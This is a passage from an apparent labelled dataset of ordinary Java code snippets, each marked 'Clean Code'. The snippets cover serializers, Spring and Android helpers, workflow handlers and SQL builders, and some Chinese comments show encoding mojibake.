  fury.getClassResolver().setSerializer(cls,this);
}
",0,Clean Code
"public void setMp(int i){
  this.getOwner().getLineupManager().setMp(i);
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)40);
    output.writeUInt32NoTag(relicUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)82);
    output.writeMessageNoTag(itemCostList);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.relicUniqueId,relicUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.itemCostList,itemCostList);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * Fetch execution logs for a task.
 * @param taskId id of the task.
 */
public List<TaskExecLog> getTaskLogs(String taskId){
  Validate.notBlank(taskId,""Task id cannot be blank"");
  return getForEntity(""tasks/{taskId}/log"",null,taskExecLogList,taskId);
}
",0,Clean Code
"public static void setCollectTimeout(int i){
  getConfig().collectTimeout=i;
  hasChanged=true;
}
",0,Clean Code
"/** 
 * API equivalent of the repeatable  {@code --property} CLI option. 
 */
public Builder externalProperties(Map<String,String> externalProperties){
  this.externalProperties=externalProperties;
  return this;
}
",0,Clean Code
"@Override public void skipTaskFromWorkflow(WorkflowServicePb.SkipTaskRequest req,StreamObserver<WorkflowServicePb.SkipTaskResponse> response){
  try {
    SkipTaskRequest skipTask=PROTO_MAPPER.fromProto(req.getRequest());
    workflowService.skipTaskFromWorkflow(req.getWorkflowId(),req.getTaskReferenceName(),skipTask);
    response.onNext(WorkflowServicePb.SkipTaskResponse.getDefaultInstance());
    response.onCompleted();
  }
 catch (  Exception e) {
    GRPC_HELPER.onError(response,e);
  }
}
",0,Clean Code
"public static String millSecConvertToTimeStr(long time,String cycleUnit){
  return millSecConvertToTimeStr(time,cycleUnit,TimeZone.getDefault());
}
public static String millSecConvertToTimeStr(long time,String cycleUnit,TimeZone tz){
  String retTime=null;
  Calendar calendarInstance=Calendar.getInstance();
  calendarInstance.setTimeInMillis(time);
  Date dateTime=calendarInstance.getTime();
  SimpleDateFormat df=null;
  if (""Y"".equalsIgnoreCase(cycleUnit)) {
    df=new SimpleDateFormat(""yyyy"");
  }
 else   if (""M"".equals(cycleUnit)) {
    df=new SimpleDateFormat(""yyyyMM"");
  }
 else   if (""D"".equalsIgnoreCase(cycleUnit)) {
    df=new SimpleDateFormat(""yyyyMMdd"");
  }
 else   if (""h"".equalsIgnoreCase(cycleUnit)) {
    df=new SimpleDateFormat(""yyyyMMddHH"");
  }
 else   if (cycleUnit.contains(""m"")) {
    df=new SimpleDateFormat(""yyyyMMddHHmm"");
  }
 else {
    logger.error(""cycleUnit {} can't parse!"",cycleUnit);
    df=new SimpleDateFormat(""yyyyMMddHH"");
  }
  df.setTimeZone(tz);
  retTime=df.format(dateTime);
  if (cycleUnit.contains(""m"")) {
    int cycleNum=Integer.parseInt(cycleUnit.substring(0,cycleUnit.length() - 1));
    int mmTime=Integer.parseInt(retTime.substring(retTime.length() - 2,retTime.length()));
    String realMMTime="""";
    if (cycleNum * (mmTime / cycleNum) <= 0) {
      realMMTime=""0"" + cycleNum * (mmTime / cycleNum);
    }
 else {
      realMMTime="""" + cycleNum * (mmTime / cycleNum);
    }
    retTime=retTime.substring(0,retTime.length() - 2) + realMMTime;
  }
  return retTime;
}",0,Clean Code
"private void readPrivAppPermissions(@NonNull XmlPullParser parser,ArrayMap<String,Set<String>> grantMap,ArrayMap<String,Set<String>> denyMap) throws IOException, XmlPullParserException {
  String packageName=parser.getAttributeValue(null,""package"");
  if (TextUtils.isEmpty(packageName)) {
    Log.w(TAG,""package is required for <privapp-permissions> in "" + parser.getPositionDescription());
    return;
  }
  Set<String> permissions=grantMap.get(packageName);
  if (permissions == null) {
    permissions=new HashSet<>();
  }
  Set<String> denyPermissions=denyMap.get(packageName);
  int depth=parser.getDepth();
  while (XmlUtils.nextElementWithin(parser,depth)) {
    String name=parser.getName();
    if (""permission"".equals(name)) {
      String permName=parser.getAttributeValue(null,""name"");
      if (TextUtils.isEmpty(permName)) {
        Log.w(TAG,""name is required for <permission> in "" + parser.getPositionDescription());
        continue;
      }
      permissions.add(permName);
    }
 else     if (""deny-permission"".equals(name)) {
      String permName=parser.getAttributeValue(null,""name"");
      if (TextUtils.isEmpty(permName)) {
        Log.w(TAG,""name is required for <deny-permission> in "" + parser.getPositionDescription());
        continue;
      }
      if (denyPermissions == null) {
        denyPermissions=new HashSet<>();
      }
      denyPermissions.add(permName);
    }
  }
  grantMap.put(packageName,permissions);
  if (denyPermissions != null) {
    denyMap.put(packageName,denyPermissions);
  }
}
",0,Clean Code
"@ApiOperation(""澶勭悊閫炬湡寰呭鏍歌妭鐐�"") @PostMapping(""/dealWithOverdueStage"") public Result dealWithOverdueStage(){
  appraisalEmployeeService.dealWithOverdueUnAudit();
  return Result.ok();
}
",0,Clean Code
"private void updateViews(){
  if (getGraph() == null) {
    return;
  }
  getGraph().updateViews();
}
",0,Clean Code
"/** 
 * 鏌ヨ鏂板鎵�闇�瑕佸瓧娈�
 * @param entryStatus
 * @return
 */
List<HrmModelFiledVO> queryEmployeeField(Integer entryStatus);
",0,Clean Code
"@ConditionalOnProperty(name=""conductor.default-event-queue.type"",havingValue=""sqs"",matchIfMissing=true) @Bean public Map<Status,ObservableQueue> getQueues(ConductorProperties conductorProperties,SQSEventQueueProperties properties,AmazonSQS sqsClient){
  String stack="""";
  if (conductorProperties.getStack() != null && conductorProperties.getStack().length() > 0) {
    stack=conductorProperties.getStack() + ""_"";
  }
  Status[] statuses=new Status[]{Status.COMPLETED,Status.FAILED};
  Map<Status,ObservableQueue> queues=new HashMap<>();
  for (  Status status : statuses) {
    String queuePrefix=StringUtils.isBlank(properties.getListenerQueuePrefix()) ? conductorProperties.getAppId() + ""_sqs_notify_"" + stack : properties.getListenerQueuePrefix();
    String queueName=queuePrefix + status.name();
    Builder builder=new Builder().withClient(sqsClient).withQueueName(queueName);
    String auth=properties.getAuthorizedAccounts();
    String[] accounts=auth.split("","");
    for (    String accountToAuthorize : accounts) {
      accountToAuthorize=accountToAuthorize.trim();
      if (accountToAuthorize.length() > 0) {
        builder.addAccountToAuthorize(accountToAuthorize.trim());
      }
    }
    ObservableQueue queue=builder.build();
    queues.put(status,queue);
  }
  return queues;
}",0,Clean Code
"public Union(SourceSection sourceSection,int defaultIndex,UnresolvedTypeNode[] elementTypeNodes){
  super(sourceSection);
  this.unresolvedElementTypeNodes=elementTypeNodes;
  this.defaultIndex=defaultIndex;
}
public Union(SourceSection sourceSection,Object actualValue,UnionTypeNode typeCheckNode,VmTypeMismatchException[] children){
  super(sourceSection,actualValue);
  this.typeCheckNode=typeCheckNode;
  this.children=children;
}
",0,Clean Code
"/** 
 * 姣忓ぉ鍑屾櫒4鐐规墽琛
 * @Scheduled(cron = ""0 0/1 * * * ?"")
 */
@Scheduled(cron=""0 0 04 * * ?"") @Transactional(rollbackFor=Exception.class) public void delExpireRecycle(){
  ParamEntity param=paramService.getValue(ParamEnum.ARTICLE_RECYCLE_EXP_DAYS);
  int expireDay=-60;
  if (param != null) {
    expireDay=Integer.parseInt(param.getParamValue());
  }
  if (expireDay > 0) {
    expireDay=expireDay * -1;
  }
  log.info(""[BLOSSOM] 鍒犻櫎{}鏃ュ墠鐨勬枃绔犲洖鏀剁珯璁板綍"",Math.abs(expireDay));
  Date expireDate=DateUtils.offsetDay(DateUtils.date(),expireDay);
  LambdaQueryWrapper<ArticleRecycleEntity> where=new LambdaQueryWrapper<>();
  where.lt(ArticleRecycleEntity::getDelTime,DateUtils.toYMD(expireDate));
  baseMapper.delete(where);
}",0,Clean Code
"/** 
 * @return factory for creating RollRogueBuffScRsp messages
 */
public static MessageFactory<RollRogueBuffScRsp> getFactory(){
  return RollRogueBuffScRspFactory.INSTANCE;
}
",0,Clean Code
"private <T>List<T> nullSafeList(List<T> list){
  return list != null ? list : Collections.emptyList();
}
",0,Clean Code
"int getNumberOfRegisters();
",0,Clean Code
"@NonNull public static FilterOption create(@NonNull String filterName){
switch (filterName) {
case ""apk_size"":
    return new ApkSizeOption();
case ""app_label"":
  return new AppLabelOption();
case ""backup"":
return new BackupOption();
case ""bloatware"":
return new BloatwareOption();
case ""cache_size"":
return new CacheSizeOption();
case ""components"":
return new ComponentsOption();
case ""data_size"":
return new DataSizeOption();
case ""data_usage"":
return new DataUsageOption();
case ""installed"":
return new InstalledOption();
case ""installer"":
return new InstallerOption();
case ""last_update"":
return new LastUpdateOption();
case ""min_sdk"":
return new MinSdkOption();
case ""pkg_name"":
return new PackageNameOption();
case ""running_apps"":
return new RunningAppsOption();
case ""screen_time"":
return new ScreenTimeOption();
case ""signature"":
return new SignatureOption();
case ""target_sdk"":
return new TargetSdkOption();
case ""times_opened"":
return new TimesOpenedOption();
case ""total_size"":
return new TotalSizeOption();
case ""trackers"":
return new TrackersOption();
case ""version_name"":
return new VersionNameOption();
}
throw new IllegalArgumentException(""Invalid filter: "" + filterName);
}
",0,Clean Code
"public String toString(){
  return ""GProExposeRecommedsReq{user="" + this.user + "",traceId=""+ this.traceId+ "",stage=""+ this.stage+ "",exposeItems=""+ this.exposeItems+ "",}"";
}
",0,Clean Code
"String getGuildFace();
",0,Clean Code
"public void setUserInfo(TLRPC.UserFull value,ProfileChannelCell.ChannelMessageFetcher channelMessageFetcher,ProfileBirthdayEffect.BirthdayEffectFetcher birthdayAssetsFetcher){
  userInfo=value;
  if (storyView != null) {
    storyView.setStories(userInfo.stories);
  }
  if (avatarImage != null) {
    avatarImage.setHasStories(needInsetForStories());
  }
  if (sharedMediaLayout != null) {
    sharedMediaLayout.setUserInfo(userInfo);
  }
  if (profileChannelMessageFetcher == null) {
    profileChannelMessageFetcher=channelMessageFetcher;
  }
  if (profileChannelMessageFetcher == null) {
    profileChannelMessageFetcher=new ProfileChannelCell.ChannelMessageFetcher(currentAccount);
  }
  profileChannelMessageFetcher.subscribe(() -> updateListAnimated(false));
  profileChannelMessageFetcher.fetch(userInfo);
  if (birthdayFetcher == null) {
    birthdayFetcher=birthdayAssetsFetcher;
  }
  if (birthdayFetcher == null) {
    birthdayFetcher=ProfileBirthdayEffect.BirthdayEffectFetcher.of(currentAccount,userInfo,birthdayFetcher);
    createdBirthdayFetcher=birthdayFetcher != null;
  }
  if (birthdayFetcher != null) {
    birthdayFetcher.subscribe(this::createBirthdayEffect);
  }
  if (otherItem != null) {
    otherItem.setSubItemShown(start_secret_chat,!getMessagesController().isUserPremiumBlocked(userId));
  }
}
",0,Clean Code
"public void loadPreviewColors(int currentAccount){
  for (int i=0; i < items.size(); i++) {
    if (items.get(i) == null) {
      continue;
    }
    HashMap<String,Integer> colorsMap=getPreviewColors(currentAccount,i);
    Integer color=colorsMap.get(Theme.key_chat_inBubble);
    if (color == null) {
      color=Theme.getDefaultColor(Theme.key_chat_inBubble);
    }
    items.get(i).inBubbleColor=color;
    color=colorsMap.get(Theme.key_chat_outBubble);
    if (color == null) {
      color=Theme.getDefaultColor(Theme.key_chat_outBubble);
    }
    items.get(i).outBubbleColor=color;
    color=colorsMap.get(Theme.key_featuredStickers_addButton);
    if (color == null) {
      color=Theme.getDefaultColor(Theme.key_featuredStickers_addButton);
    }
    items.get(i).outLineColor=color;
    color=colorsMap.get(Theme.key_chat_wallpaper);
    if (color == null) {
      items.get(i).patternBgColor=0;
    }
 else {
      items.get(i).patternBgColor=color;
    }
    color=colorsMap.get(Theme.key_chat_wallpaper_gradient_to1);
    if (color == null) {
      items.get(i).patternBgGradientColor1=0;
    }
 else {
      items.get(i).patternBgGradientColor1=color;
    }
    color=colorsMap.get(Theme.key_chat_wallpaper_gradient_to2);
    if (color == null) {
      items.get(i).patternBgGradientColor2=0;
    }
 else {
      items.get(i).patternBgGradientColor2=color;
    }
    color=colorsMap.get(Theme.key_chat_wallpaper_gradient_to3);
    if (color == null) {
      items.get(i).patternBgGradientColor3=0;
    }
 else {
      items.get(i).patternBgGradientColor3=color;
    }
    color=colorsMap.get(Theme.key_chat_wallpaper_gradient_rotation);
    if (color == null) {
      items.get(i).patternBgRotation=0;
    }
 else {
      items.get(i).patternBgRotation=color;
    }
    if (items.get(i).themeInfo != null && items.get(i).themeInfo.getKey().equals(""Blue"")) {
      int accentId=items.get(i).accentId >= 0 ? items.get(i).accentId : items.get(i).themeInfo.currentAccentId;
      if (accentId == 99) {
        items.get(i).patternBgColor=0xffdbddbb;
        items.get(i).patternBgGradientColor1=0xff6ba587;
        items.get(i).patternBgGradientColor2=0xffd5d88d;
        items.get(i).patternBgGradientColor3=0xff88b884;
      }
    }
  }
}",0,Clean Code
"@Inject public TaskStatusPublisher(RestClientManager rcm,ExecutionDAOFacade executionDAOFacade,List<String> subscribedTaskStatuses){
  this.rcm=rcm;
  this.executionDAOFacade=executionDAOFacade;
  this.subscribedTaskStatusList=subscribedTaskStatuses;
  validateSubscribedTaskStatuses(subscribedTaskStatuses);
  ConsumerThread consumerThread=new ConsumerThread();
  consumerThread.start();
}
",0,Clean Code
"/** 
 * 缁熶竴瀵煎嚭鏁版嵁妯℃澘
 */
public static void exportExcelCsv(List<? extends Map<String,Object>> dataList,ExcelParseService excelParseService,List<?> list,File file){
  CsvWriter writer;
  boolean isInit=false;
  if (THREAD_LOCAL.get() == null) {
    writer=CsvUtil.getWriter(file,Charset.defaultCharset());
    THREAD_LOCAL.set(writer);
    isInit=true;
  }
 else {
    writer=(CsvWriter)THREAD_LOCAL.get();
  }
  List<ExcelDataEntity> headList=excelParseService.parseData(list,false);
  Map<String,Integer> headMap=new HashMap<>(headList.size(),1.0f);
  List<Object> names=new ArrayList<>();
  List<String> fieldNames=new LinkedList<>();
  for (  ExcelDataEntity head : headList) {
    if (isInit) {
      names.add(head.getName());
    }
    fieldNames.add(head.getFieldName());
    if (!Arrays.asList(FieldEnum.AREA.getType(),FieldEnum.CURRENT_POSITION.getType(),FieldEnum.DETAIL_TABLE.getType()).contains(head.getType())) {
      headMap.put(head.getFieldName(),head.getType());
    }
  }
  List<List<Object>> writerList=new ArrayList<>();
  if (!names.isEmpty()) {
    writerList.add(names);
  }
  formatData(dataList,excelParseService,headMap);
  for (  Map<String,Object> data : dataList) {
    List<Object> values=new ArrayList<>();
    for (    String fieldName : fieldNames) {
      values.add(data.get(fieldName));
    }
    writerList.add(values);
  }
  writer.write(writerList);
}",0,Clean Code
"private void createPanel(final boolean indeterminate,final boolean showSeconds,final boolean showCancelButton,final boolean addBorder){
  setLayout(new BorderLayout());
  final JPanel pPb=new JPanel(new BorderLayout());
  pPb.setBorder(new TitledBorder(""""));
  if (m_description == null) {
    m_label.setVisible(false);
  }
 else {
    m_label.setText(convertTextToHtml(m_description));
  }
  pPb.add(m_label,BorderLayout.NORTH);
  m_progressBar.setIndeterminate(indeterminate);
  m_progressBar.setStringPainted(true);
  final JPanel borderPanel=new JPanel(new BorderLayout());
  if (addBorder) {
    borderPanel.setBorder(BorderFactory.createCompoundBorder(new LineBorder(Color.GRAY),new EmptyBorder(1,1,1,1)));
  }
  if (showCancelButton) {
    final JPanel buttonPanel=new JPanel(new BorderLayout());
    final JButton cancelButton=new JButton(new CancelAction());
    cancelButton.setFocusable(false);
    final JPanel paddingPanel=new JPanel(new BorderLayout());
    paddingPanel.setBorder(new EmptyBorder(0,1,0,0));
    paddingPanel.setMinimumSize(new Dimension(1,0));
    buttonPanel.add(paddingPanel,BorderLayout.WEST);
    buttonPanel.add(cancelButton,BorderLayout.EAST);
    borderPanel.add(buttonPanel,BorderLayout.EAST);
  }
  borderPanel.add(m_progressBar,BorderLayout.CENTER);
  pPb.add(borderPanel,BorderLayout.CENTER);
  if (indeterminate && showSeconds) {
    updateSecondsText();
    m_timer.setRepeats(true);
  }
  add(pPb,BorderLayout.NORTH);
}",0,Clean Code
"@AnyThread public void loadInstalledApps(){
  if (mLoadAppsResult != null) {
    mLoadAppsResult.cancel(true);
  }
  mLoadAppsResult=ThreadUtils.postOnBackgroundThread(() -> {
    PackageManager pm=getApplication().getPackageManager();
    try {
      ArrayList<Pair<CharSequence,ApplicationInfo>> itemPairs;
      List<ApplicationInfo> applicationInfoList;
      applicationInfoList=PackageUtils.getAllApplications(MATCH_UNINSTALLED_PACKAGES | MATCH_STATIC_SHARED_AND_SDK_LIBRARIES);
      HashSet<String> applicationInfoHashMap=new HashSet<>();
      itemPairs=new ArrayList<>();
      for (      ApplicationInfo info : applicationInfoList) {
        if (applicationInfoHashMap.contains(info.packageName)) {
          continue;
        }
        applicationInfoHashMap.add(info.packageName);
        itemPairs.add(new Pair<>(pm.getApplicationLabel(info),info));
        if (ThreadUtils.isInterrupted()) {
          return;
        }
      }
      List<String> selectedPackages=mProfile != null ? Arrays.asList(mProfile.packages) : Collections.emptyList();
      Collections.sort(itemPairs,(o1,o2) -> o1.first.toString().compareToIgnoreCase(o2.first.toString()));
      Collections.sort(itemPairs,(o1,o2) -> {
        boolean o1Selected=selectedPackages.contains(o1.second.packageName);
        boolean o2Selected=selectedPackages.contains(o2.second.packageName);
        if (o1Selected && o2Selected) {
          return 0;
        }
        if (o1Selected) {
          return -1;
        }
        if (o2Selected) {
          return +1;
        }
        return 0;
      }
);
      mInstalledApps.postValue(itemPairs);
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
);
}",0,Clean Code
"public TreeNodeSearcher(final boolean regEx,final boolean isCaseSensitive,final boolean isPrimary,final boolean isSecondary,final boolean useTemporaryResult,final boolean highlightGraphNodes){
  this.isRegEx=regEx;
  this.isCaseSensitive=isCaseSensitive;
  this.isPrimary=isPrimary;
  this.isSecondary=isSecondary;
  this.useTemporaryResult=useTemporaryResult;
  this.highlightGraphNodes=highlightGraphNodes;
  this.searchText="""";
}
",0,Clean Code
"private void setScrollY(float value){
  if (fragmentView == null) {
    return;
  }
  if (scrimView != null) {
    scrimView.getLocationInWindow(scrimViewLocation);
  }
  actionBar.setTranslationY(value);
  if (topBulletin != null) {
    topBulletin.updatePosition();
  }
  if (filterTabsView != null) {
    filterTabsView.setTranslationY(value);
  }
  if (dialogsHintCell != null) {
    dialogsHintCell.setTranslationY(value);
  }
  if (animatedStatusView != null) {
    animatedStatusView.translateY2((int)value);
    animatedStatusView.setAlpha(1f - -value / ActionBar.getCurrentActionBarHeight());
  }
  updateContextViewPosition();
  if (viewPages != null) {
    for (int a=0; a < viewPages.length; a++) {
      viewPages[a].listView.setTopGlowOffset(viewPages[a].listView.getPaddingTop() + (int)value);
    }
  }
  fragmentView.invalidate();
}",0,Clean Code
"@NonNull public static HashMap<String,RuleType> collectComponentClassNames(String packageName,@UserIdInt int userHandle){
  try {
    PackageInfo packageInfo=PackageManagerCompat.getPackageInfo(packageName,PackageManager.GET_ACTIVITIES | PackageManager.GET_RECEIVERS | PackageManager.GET_PROVIDERS| MATCH_DISABLED_COMPONENTS| MATCH_UNINSTALLED_PACKAGES| PackageManager.GET_SERVICES| PackageManagerCompat.MATCH_STATIC_SHARED_AND_SDK_LIBRARIES,userHandle);
    return collectComponentClassNames(packageInfo);
  }
 catch (  Throwable e) {
    e.printStackTrace();
  }
  return new HashMap<>();
}
@NonNull public static HashMap<String,RuleType> collectComponentClassNames(@Nullable PackageInfo packageInfo){
  HashMap<String,RuleType> componentClasses=new HashMap<>();
  if (packageInfo == null)   return componentClasses;
  if (packageInfo.activities != null) {
    for (    ActivityInfo activityInfo : packageInfo.activities) {
      componentClasses.put(activityInfo.name,RuleType.ACTIVITY);
    }
  }
  if (packageInfo.services != null) {
    for (    ComponentInfo componentInfo : packageInfo.services)     componentClasses.put(componentInfo.name,RuleType.SERVICE);
  }
  if (packageInfo.receivers != null) {
    for (    ComponentInfo componentInfo : packageInfo.receivers)     componentClasses.put(componentInfo.name,RuleType.RECEIVER);
  }
  if (packageInfo.providers != null) {
    for (    ComponentInfo componentInfo : packageInfo.providers)     componentClasses.put(componentInfo.name,RuleType.PROVIDER);
  }
  return componentClasses;
}
",0,Clean Code
"/** 
 * 鑾峰彇鏈夋晥鏃堕棿
 * @param key Redis閿�
 * @return 鏈夋晥鏃堕棿
 */
public long getExpire(final String key){
  return redisTemplate.getExpire(key);
}
",0,Clean Code
"@Override public int getMyTalkPermissionType(){
  return this.mChannel.getMySpeakPermission();
}
",0,Clean Code
"@Bean public VertexAI vertexAiApi(){
  String projectId=System.getenv(""VERTEX_AI_GEMINI_PROJECT_ID"");
  String location=System.getenv(""VERTEX_AI_GEMINI_LOCATION"");
  return new VertexAI.Builder().setProjectId(projectId).setLocation(location).setTransport(Transport.REST).build();
}
",0,Clean Code
"/** 
 * Create an new audio api.
 * @param openAiToken OpenAI apiKey.
 */
public OpenAiAudioApi(String openAiToken){
  this(ApiUtils.DEFAULT_BASE_URL,openAiToken,RestClient.builder(),WebClient.builder(),RetryUtils.DEFAULT_RESPONSE_ERROR_HANDLER);
}
/** 
 * Create an new chat completion api.
 * @param baseUrl api base URL.
 * @param openAiToken OpenAI apiKey.
 * @param restClientBuilder RestClient builder.
 * @param responseErrorHandler Response error handler.
 */
public OpenAiAudioApi(String baseUrl,String openAiToken,RestClient.Builder restClientBuilder,ResponseErrorHandler responseErrorHandler){
  this.restClient=restClientBuilder.baseUrl(baseUrl).defaultHeaders(headers -> {
    headers.setBearerAuth(openAiToken);
  }
).defaultStatusHandler(responseErrorHandler).build();
  this.webClient=WebClient.builder().baseUrl(baseUrl).defaultHeaders(headers -> {
    headers.setBearerAuth(openAiToken);
  }
).defaultHeaders(ApiUtils.getJsonContentHeaders(openAiToken)).build();
}
/** 
 * Create an new chat completion api.
 * @param baseUrl api base URL.
 * @param openAiToken OpenAI apiKey.
 * @param restClientBuilder RestClient builder.
 * @param webClientBuilder WebClient builder.
 * @param responseErrorHandler Response error handler.
 */
public OpenAiAudioApi(String baseUrl,String openAiToken,RestClient.Builder restClientBuilder,WebClient.Builder webClientBuilder,ResponseErrorHandler responseErrorHandler){
  this.restClient=restClientBuilder.baseUrl(baseUrl).defaultHeaders(headers -> {
    headers.setBearerAuth(openAiToken);
  }
).defaultStatusHandler(responseErrorHandler).build();
  this.webClient=webClientBuilder.baseUrl(baseUrl).defaultHeaders(headers -> {
    headers.setBearerAuth(openAiToken);
  }
).defaultHeaders(ApiUtils.getJsonContentHeaders(openAiToken)).build();
}
",0,Clean Code
"/** 
 * Gets the value of the internal enum store. The result is equivalent to  {@link PVEBattleResultCsReq#getEndStatus()}.getNumber().
 * @return numeric wire representation
 */
public int getEndStatusValue(){
  return endStatus;
}
",0,Clean Code
"public void setIsShowCard(boolean z){
  this.isShowCard=z;
}
",0,Clean Code
"@Specialization protected VmMapping eval(VmMap self){
  var members=EconomicMaps.<Object,ObjectMember>create(self.getLength());
  for (  var entry : self) {
    EconomicMaps.put(members,VmUtils.getKey(entry),VmUtils.createSyntheticObjectEntry("""",VmUtils.getValue(entry)));
  }
  return new VmMapping(VmUtils.createEmptyMaterializedFrame(),BaseModule.getMappingClass().getPrototype(),members);
}
",0,Clean Code
"@Override public void onPageFinished(WebView view,String url){
  info="""";
  if (currentLiveIndex <= 19) {
    view.evaluateJavascript(""document.querySelector('#jiemu > li.cur.act').innerText"",value -> {
      if (!value.equals(""null"") && !value.isEmpty()) {
        String elementValueNow=value.replace(""\"""","""");
        info+=elementValueNow + ""\n"";
      }
    }
);
    view.evaluateJavascript(""document.querySelector('#jiemu > li:nth-child(4)').innerText"",value -> {
      if (!value.equals(""null"") && !value.isEmpty()) {
        String elementValueNext=value.replace(""\"""","""");
        info+=elementValueNext;
      }
    }
);
  }
 else   if (currentLiveIndex <= 40) {
    view.evaluateJavascript(""document.getElementsByClassName(\""tvSelectJiemu\"")[0].innerHTML + \"" \"" + document.getElementsByClassName(\""tvSelectJiemu\"")[1].innerHTML"",value -> {
      if (!value.equals(""null"") && !value.isEmpty()) {
        String elementValueNow=value.replace(""\"""","""");
        info+=elementValueNow;
      }
    }
);
  }
  String script1=null;
  String script2=null;
  if (currentLiveIndex <= 19) {
    view.evaluateJavascript(script1,null);
  }
 else   if (currentLiveIndex <= 40) {
    new Handler().postDelayed(() -> {
      view.evaluateJavascript(script2,null);
    }
,3000);
  }
  new Handler().postDelayed(() -> {
    simulateTouch(view,0.5f,0.5f);
    loadingOverlay.setVisibility(View.GONE);
    showOverlay(channelNames[currentLiveIndex] + ""\n"" + info);
  }
,5000);
}",0,Clean Code
"void onPushUserScreenShare(long j2,long j3,ArrayList<GProScreenShareUser> arrayList,byte[] bArr);",0,Clean Code
"/** 
 * <code>repeated uint32 rogue_miracle_list = 8;</code>
 * @param value the rogueMiracleList to add
 * @return this
 */
public RogueRecordInfo addRogueMiracleList(final int value){
  bitField0_|=0x00000001;
  rogueMiracleList.add(value);
  return this;
}",0,Clean Code
"@Nullable ArrayList<IGProAppInfo> getAppInfos();
",0,Clean Code
"@Override public ChessRogueNousQueryInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  return this;
}",0,Clean Code
"public static MarkReadMailScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new MarkReadMailScRsp(),data).checkInitialized();
}
public static MarkReadMailScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new MarkReadMailScRsp(),input).checkInitialized();
}
public static MarkReadMailScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new MarkReadMailScRsp(),input).checkInitialized();
}
",0,Clean Code
"void setUpdater(IRealizerUpdater<? extends ZyGraphNode<?>> updater);
",0,Clean Code
"/** 
 * <code>repeated uint32 lighten_section_list = 9;</code>
 * @return whether the lightenSectionList field is set
 */
public boolean hasLightenSectionList(){
  return (bitField0_ & 0x00000010) != 0;
}",0,Clean Code
"@Override public IStateAction<CBendEnterState> createBendEnterAction(){
  return new CDefaultBendEnterAction();
}
",0,Clean Code
"public Long getLong(String key,long def){
  return joCurrent.optLong(key,def);
}
public Long getLong(RuntimeInfoKey key){
  return joCurrent.optLong(key.name(),0L);
}",0,Clean Code
"/** 
 * Build the statement of CreateTable
 * @param database The database of Doris
 * @param table The table of Doris
 * @param primaryKeys The primary key of Doris
 * @param operation The Operation
 * @return A statement of CreateTable
 */
public String buildCreateTableStatement(String database,String table,List<String> primaryKeys,CreateTableOperation operation){
  StringBuilder sb=new StringBuilder();
  sb.append(""CREATE TABLE IF NOT EXISTS `"").append(database).append(""`.`"").append(table).append(""`(\n"");
  Preconditions.checkState(operation.getColumns() != null && !operation.getColumns().isEmpty(),String.format(""The columns of table: %s.%s is empty"",database,table));
  Iterator<Column> iterator=operation.getColumns().iterator();
  StringJoiner joiner=new StringJoiner("","");
  while (iterator.hasNext()) {
    Column column=iterator.next();
    Preconditions.checkNotNull(column,""The column is null"");
    Preconditions.checkState(column.getName() != null && !column.getName().trim().isEmpty(),""The column name is blank"");
    sb.append(""\t`"").append(column.getName()).append(""` "").append(convert2DorisType(column.getJdbcType(),column.isNullable(),column.getDefinition()));
    if (validDefaultValue(column.getDefaultValue())) {
      sb.append("" DEFAULT "").append(quote(column.getDefaultValue()));
    }
    if (column.getComment() != null) {
      sb.append("" COMMENT "").append(quote(column.getComment()));
    }
    joiner.add(String.format(""`%s`"",column.getName()));
    if (iterator.hasNext()) {
      sb.append("",\n"");
    }
  }
  sb.append(""\n)\n"");
  String model=""DUPLICATE"";
  if (primaryKeys != null && !primaryKeys.isEmpty()) {
    model=""UNIQUE"";
    joiner=new StringJoiner("","");
    for (    String primaryKey : primaryKeys) {
      joiner.add(String.format(""`%s`"",primaryKey));
    }
  }
  String keys=joiner.toString();
  sb.append(model).append("" KEY("").append(keys).append("")"");
  if (StringUtils.isNotBlank(operation.getComment())) {
    sb.append(""\nCOMMENT "").append(quote(operation.getComment()));
  }
  sb.append(""\nDISTRIBUTED BY HASH("").append(keys).append("")"");
  sb.append(""\nPROPERTIES (\n\t\""light_schema_change\"" = \""true\""\n)"");
  return sb.toString();
}",0,Clean Code
"@PostMapping(""/crmCustomerJob/todayContact"") Result todayContact();
",0,Clean Code
"public static boolean isNotSet(MemoryBuffer bitmapBuffer,int baseOffset,int index){
  final int byteIndex=baseOffset + (index >> 3);
  final int bitIndex=index & 7;
  final byte b=bitmapBuffer.getByte(byteIndex);
  return ((b >> bitIndex) & 0x01) == 0;
}",0,Clean Code
"@Override public GetCurLineupDataScRsp create(){
  return GetCurLineupDataScRsp.newInstance();
}
",0,Clean Code
"@Override public boolean add(String s){
  return data.add(s);
}
",0,Clean Code
"public int getWidth(){
  return width;
}
",0,Clean Code
"@Override public IGProUserGuideBubble getBubble(){
  return null;
}
",0,Clean Code
"@Specialization(guards=""checkIsValidListingAmendment()"") protected VmListing evalListing(VirtualFrame frame,VmListing parent){
  checkMaxListingMemberIndex(parent.getLength());
  return new VmListing(frame.materialize(),parent,members,parent.getLength());
}
",0,Clean Code
"/** 
 * Constructs a Moderation object that is not flagged.
 * @return a Moderation object.
 */
public static Moderation notFlagged(){
  return new Moderation();
}
",0,Clean Code
"public static Glyph getOutputGlyph(WalletTransaction walletTx,Payment payment){
  if (payment.getType().equals(Payment.Type.MIX)) {
    return getMixGlyph();
  }
 else   if (payment.getType().equals(Payment.Type.FAKE_MIX)) {
    return getFakeMixGlyph();
  }
 else   if (walletTx.isConsolidationSend(payment)) {
    return getConsolidationGlyph();
  }
 else   if (walletTx.isPremixSend(payment)) {
    return getPremixGlyph();
  }
 else   if (walletTx.isBadbankSend(payment)) {
    return getBadbankGlyph();
  }
 else   if (payment.getType().equals(Payment.Type.WHIRLPOOL_FEE)) {
    return getWhirlpoolFeeGlyph();
  }
